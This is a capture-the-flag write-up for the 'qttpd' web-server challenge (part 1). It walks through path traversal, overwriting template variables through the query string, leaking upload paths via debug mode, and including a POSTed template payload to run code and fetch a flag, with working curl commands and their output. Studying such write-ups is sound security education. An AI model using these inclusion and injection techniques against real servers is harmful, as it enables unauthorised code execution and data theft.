@@ -1,0 +1,217 @@
+qttpd
+
+Pwnable (950 pts)
+There are 3 (three) flags to be had at
+http://107.189.94.25 or
+http://107.189.94.255 or
+http://107.189.94.252 or
+http://107.189.94.253
+... good luck!
+
+Part 1:
+
+We visit the page http://107.189.94.25/, we get a template page with some sub pages with links like: http://107.189.94.25/?page=index.
+When we request something like http://107.189.94.25/?page=xxx, the server answers with "File not found (../pages/xxx.shtml)".
+After some fiddling with the url, we try http://107.189.94.25/?page=.. and get an interesting result: some kind of directory listing:
+
+"""
+$ curl http://107.189.94.25/?page=.. | hexdump -C
+[...]
+00000660  64 3d 22 6d 61 69 6e 22  3e 0a 0a 42 82 03 00 00  |d="main">..B....|
+00000670  00 00 00 20 00 00 00 00  00 00 00 18 00 01 00 2e  |... ............|
+00000680  00 63 67 63 c0 03 00 00  00 00 00 40 00 00 00 00  |.cgc.......@....|
+00000690  00 00 00 18 00 02 00 2e  2e 00 00 43 82 03 00 00  |...........C....|
+000006a0  00 00 00 60 00 00 00 00  00 00 00 20 00 08 00 2e  |...`....... ....|
+000006b0  70 72 6f 66 69 6c 65 00  68 61 74 44 82 03 00 00  |profile.hatD....|
+000006c0  00 00 00 80 00 00 00 00  00 00 00 20 00 0a 00 2e  |........... ....|
+000006d0  6c 61 73 74 6c 6f 67 69  6e 00 64 0a 41 03 00 00  |lastlogin.d.A...|
+000006e0  00 00 00 a0 00 00 00 00  00 00 00 20 00 06 00 65  |........... ...e|
+000006f0  72 72 6f 72 73 00 66 73  00 6e 62 45 82 03 00 00  |rrors.fs.nbE....|
+00000700  00 00 00 c0 00 00 00 00  00 00 00 20 00 0a 00 68  |........... ...h|
+00000710  74 74 70 64 2e 63 6f 6e  66 00 00 46 82 03 00 00  |ttpd.conf..F....|
+00000720  00 00 00 e0 00 00 00 00  00 00 00 28 00 0e 00 68  |...........(...h|
+00000730  74 74 70 64 2e 73 74 72  69 70 70 65 64 00 00 00  |ttpd.stripped...|
+00000740  00 00 00 1f 41 03 00 00  00 00 00 00 01 00 00 00  |....A...........|
+00000750  00 00 00 20 00 08 00 69  6e 63 6c 75 64 65 73 00  |... ...includes.|
+00000760  00 00 00 23 41 03 00 00  00 00 00 20 01 00 00 00  |...#A...... ....|
+00000770  00 00 00 20 00 05 00 70  61 67 65 73 00 03 00 00  |... ...pages....|
+00000780  00 00 00 2b 41 03 00 00  00 00 00 40 01 00 00 00  |...+A......@....|
+00000790  00 00 00 18 00 03 00 77  77 77 00 19 41 03 00 00  |.......www..A...|
+000007a0  00 00 00 60 01 00 00 00  00 00 00 20 00 07 00 75  |...`....... ...u|
+000007b0  70 6c 6f 61 64 73 00 00  00 00 00 47 82 03 00 00  |ploads.....G....|
+000007c0  00 00 00 80 01 00 00 00  00 00 00 20 00 05 00 66  |........... ...f|
+000007d0  6c 61 67 31 00 63 63 61  72 64 00 48 82 03 00 00  |lag1.ccard.H....|
+000007e0  00 00 00 a0 01 00 00 00  00 00 00 20 00 05 00 66  |........... ...f|
+000007f0  6c 61 67 32 00 69 6f 00  00 00 00 49 82 03 00 00  |lag2.io....I....|
+00000800  00 00 00 c0 01 00 00 00  00 00 00 20 00 05 00 66  |........... ...f|
+00000810  6c 61 67 33 00 03 00 00  00 00 00 0a 09 09 09 09  |lag3............|
+[...]
+"""
+
+We assume the following files/directories:
+"""
+.profile
+.lastlogin
+errors
+httpd.conf
+httpd.stripped
+includes
+pages
+www
+uploads
+flag1
+flag2
+flag3
+"""
+
+Unfortunately, we can not read the flags but we can read other things:
+http://107.189.94.25/?page=../httpd.conf gives us the following config file:
+"""
+num_workers = 16
+master_uid = 100
+master_gid = 100
+master_dir = /home/httpd
+worker_uid = 99
+worker_gid = 99
+chroot_dir = /home/httpd
+upload_dir = /uploads
+serve_dir = /www
+open_timeout = 5
+read_timeout = 5
+pending_timeout = 5
+finished_timeout = 5
+tmpl_timeout = 5
+tmpl_timeout_soft = 2
+tmpl_max_includes = 32
+index = index.shtml
+flag1_path = /home/httpd/flag1
+flag2_path = /home/httpd/flag2
+"""
+
+We also dump the httpd.stripped which is the httpd server binary.
+The index file should be in /www/index.shtml and indeed it is(http://107.189.94.25/?page=../www/index.shtml), the content looks like this:
+"""
+<!DOCTYPE html>
+<!-- Website template by freewebsitetemplates.com -->
+<html>
+<@
+    SCRIPT_EXT = ".shtml";
+    page = "";
+
+    include("../includes/base.inc");
+
+    if (page == "")
+        page = "index";
+@>
+<head>
+[...]
+<div id="main">
+<@
+    path = "../pages/" . page;
+    if (exists(path))
+    {
+        send_file(path);
+    }
+    else
+    {
+        path = "../pages/" . page . SCRIPT_EXT;
+        if (exists(path))
+        {
+            include(path);
+        }
+        else
+        {
+            printf("File not found (%s)\n", path);
+        }
+    }
+@>
+[...]
+"""
+
+Let's also dump the includes/base.inc:
+"""
+<@
+    register_error_handler("../includes/error.inc");
+    if (QUERY_STRING)
+        parse_query(QUERY_STRING);
+    if (POST_PATH && HTTP_CONTENT_TYPE == "application/x-www-form-urlencoded")
+    {
+        parse_query(read_file(".." . POST_PATH));
+    }
+@>
+"""
+
+and the includes/error.inc:
+"""
+<@
+if (DEBUG == "on") {
+    var_dump();
+}
+else {
+@>
+<!-- Error during execution -->
+<@
+}
+@>
+"""
+
+We learn, that the page executes this shtml code (only relevant):
+"""
+SCRIPT_EXT = ".shtml";
+if(QUERY_STRING)
+  parse_query(QUERY_STRING);
+if(exists(path)) {
+  ...
+} else {
+  path = "../pages/" . page . SCRIPT_EXT;
+  if(exists(path)) {
+    include(path);
+  }
+...
+"""
+
+The parse_query function parses the QUERY_STRING and imports all parameters as variables. That means, we can replace the file extension appended to the path when the original path is not found and thus execute any file we want.
+
+From reversing the httpd server binary, we found, that calling the get_flag() function should return the first flag, so let's get "code exec".
+First, lets enable debug mode and see where our uploaded files are stored:
+"""
+$ curl --data test "http://107.189.94.25/?DEBUG=on&page=../includes/error&SCRIPT_EXT=.inc"
+[...]
+<!-- POST_PATH = /uploads/312F005917FB5//data4ebed014.0 -->
+<!-- QUERY_STRING = DEBUG=on&page=../includes/error&SCRIPT_EXT=.inc -->
+<!-- REQUEST_URI = / -->
+<!-- path = ../pages/../includes/error.inc -->
+<!-- DEBUG = on -->
+<!-- HTTP_CONTENT_TYPE = application/x-www-form-urlencoded -->
+<!-- page = ../includes/error -->
+<!-- SCRIPT_EXT = .inc -->
+<!-- HTTP_USER_AGENT = curl/7.35.0 -->
+<!-- METHOD = POST -->
+<!-- HTTP_HOST = 107.189.94.25 -->
+<!-- HTTP_ACCEPT = */* -->
+<!-- POST_LENGTH = 4 -->
+<!-- VERSION = HTTP/1.1 -->
+<!-- REMOTE_IP = ::ffff:89.0.47.49 -->
+<!-- HTTP_CONTENT_LENGTH = 4 -->
+[...]
+"""
+
+The upload path seems to be relatively constant:
+"""
+$ for ((i=0;i<10;i++)); do curl --data test "http://107.189.94.25/?DEBUG=on&page=../includes/error&SCRIPT_EXT=.inc" 2>/dev/null |grep POST_PATH; done|uniq -c
+      1 <!-- POST_PATH = /uploads/312F00591803D//data4ebed014.0 -->
+      2 <!-- POST_PATH = /uploads/312F00591803E//data4ebed014.0 -->
+      3 <!-- POST_PATH = /uploads/312F00591803F//data4ebed014.0 -->
+      2 <!-- POST_PATH = /uploads/312F005918040//data4ebed014.0 -->
+      2 <!-- POST_PATH = /uploads/312F005918041//data4ebed014.0 -->
+"""
+
+If we combine what we know, we can try to include our POST content:
+"""
+$ curl --data '<@ echo(get_flag()); @>' "http://107.189.94.25/?SCRIPT_EXT=.0&page=../"`curl --data test "http://107.189.94.25/?DEBUG=on&page=../includes/error&SCRIPT_EXT=.inc"|grep POST_PATH|cut -d/ -f2-|cut -d. -f1`
+[...]
+flag{1down_2togo_hint_650sp1}
+[...]
+"""
+
++=200 --spq
